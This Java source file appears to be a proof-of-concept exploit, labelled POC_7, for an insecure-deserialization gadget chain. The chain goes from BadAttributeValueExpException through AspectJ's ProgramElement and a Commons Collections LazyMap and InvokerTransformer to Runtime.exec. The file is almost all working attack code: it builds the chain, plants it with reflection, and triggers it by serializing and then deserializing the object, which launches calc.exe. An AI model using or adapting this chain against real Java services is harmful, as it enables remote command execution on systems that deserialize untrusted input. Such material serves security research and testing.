package com.example.AspectJWeaver;

import com.example.Utils.ReflectionUtil;
import com.example.Utils.SerializeUtil;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.aspectj.asm.internal.ProgramElement;

import javax.management.BadAttributeValueExpException;
import java.util.HashMap;
import java.util.Map;

public class POC_7 {

    /***
     * <javax.management.BadAttributeValueExpException: void readObject(java.io.ObjectInputStream)>-
     * <org.aspectj.asm.internal.ProgramElement: java.lang.String toString()>
     * <org.aspectj.asm.internal.ProgramElement: java.lang.String toLabelString()>
     * <org.aspectj.asm.internal.ProgramElement: java.lang.String toLabelString(boolean)>
     * <org.aspectj.asm.internal.ProgramElement: java.lang.String toSignatureString(boolean)>
     * <org.aspectj.asm.internal.ProgramElement: java.util.List getParameterTypes()>
     * <org.aspectj.asm.internal.ProgramElement: java.util.List getParameterSignatures()>
     * <org.apache.commons.collections.map.LazyMap: java.lang.Object get(java.lang.Object)>
     * <org.apache.commons.collections.functors.InvokerTransformer: java.lang.Object transform(java.lang.Object)>
     * <java.lang.Runtime: java.lang.Process exec(java.lang.String)>
     */

    public static void main(String[] args) throws Exception {
        String[] execArgs = new String[] {"calc.exe"};
        final Transformer transformerChain = new ChainedTransformer(new Transformer[]{new ConstantTransformer(1)});
        final Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {
                        String.class, Class[].class }, new Object[] {
                        "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {
                        Object.class, Object[].class }, new Object[] {
                        null, new Object[0] }),
                new InvokerTransformer("exec",
                        new Class[] { String.class }, execArgs),
                new ConstantTransformer(1) };

        Map innerMap = new HashMap();

        Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

        ProgramElement element = new ProgramElement();
        ReflectionUtil.setField(element, "kvpairs", lazyMap);
        BadAttributeValueExpException bad = new BadAttributeValueExpException("1");
        ReflectionUtil.setField(bad, "val", element);

        ReflectionUtil.setField(transformerChain, "iTransformers", transformers);
        SerializeUtil.deserialize(SerializeUtil.serialize(bad));
    }

}
